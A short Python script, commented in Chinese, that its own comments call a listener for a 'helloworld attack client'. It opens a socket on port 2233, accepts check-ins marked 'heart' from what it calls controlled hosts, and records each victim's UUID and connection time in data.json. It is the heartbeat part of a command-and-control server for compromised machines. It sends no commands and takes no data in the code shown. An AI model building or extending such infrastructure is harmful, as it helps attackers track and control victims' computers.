import time
import socket
# 用于接应helloworld攻击客户端的服务模块
import json

def write(data):
	with open("data.json",'w') as ojbk:
		json.dump(data,ojbk)  

def read():
	with open("data.json") as zx:
		data = json.load(zx)
	return data

def main():
	user_list = {}
	try:
		user_list = read()
	except:
		pass

	host = ""
	port = 2233
	sock = socket.socket()
	sock.bind((host, port))
	sock.listen(5)

	print("攻击监听服务启动！")

	while True:

		cli, addr = sock.accept()
		print("\n\n客户端接入！")
		print(addr)

		#接收模式识别
		mod = cli.recv(2048).decode()

		if mod == "heart":
			cli.sendall("my".encode())
			print("被控端接入！")
			timenow = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
			print(timenow)
			uuid = cli.recv(2048).decode()

			user_list[uuid] = timenow

			cli.sendall("stop".encode())

		print(user_list)
		write(user_list)

main()




	
			
